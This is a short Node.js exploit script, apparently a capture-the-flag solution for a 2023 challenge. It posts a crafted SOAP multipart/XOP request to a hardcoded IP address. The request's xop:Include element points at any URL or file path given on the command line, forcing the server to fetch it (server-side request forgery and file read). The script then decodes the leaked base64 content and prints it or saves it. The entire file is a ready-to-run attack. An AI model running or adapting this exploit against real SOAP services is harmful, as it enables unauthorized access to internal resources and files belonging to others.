import { writeFile } from "fs/promises";

const ssrfTarget = process.argv[2];

const body = `
--37da8100-1751-4b01-be31-b450df641f83
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-ID: <14b7e142-fe6e-4e97-88f3-630d5129602c>

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://rwctf2023.rw.com/"><soap:Body><tns:showMe><arg0><inc:Include href="${ssrfTarget}" xmlns:inc="http://www.w3.org/2004/08/xop/include"/></arg0></tns:showMe></soap:Body></soap:Envelope>
--37da8100-1751-4b01-be31-b450df641f83--`.trimStart();

const result = await fetch("http://198.11.177.96:30165/services/guidance", {
	method: "POST",
	headers: {
		"Accept": "text/html,application/xhtml+xml,application/xml,text/xml;q=0.9,*/*;q=0.8",
		"Content-Type": "multipart/related; type=\"application/xop+xml\"; start=\"<14b7e142-fe6e-4e97-88f3-630d5129602c>\"; type=\"text/xml\"; boundary=37da8100-1751-4b01-be31-b450df641f83",
		"User-Agent": "node-soap/1.0.0",
		"Accept-Encoding": "none",
		"Accept-Charset": "utf-8",
		"Host": "198.11.177.96:36883",
		"SOAPAction": "\"\"",
		"Content-Length": body.length
	},
	body
});

const text = await result.text();
const b64 = text.split("result: ")[1].split("</return>")[0];
const content = Buffer.from(b64, "base64");

if (process.argv[3] !== undefined) {
	await writeFile(process.argv[3], content);
} else {
	console.log(content.toString());
}
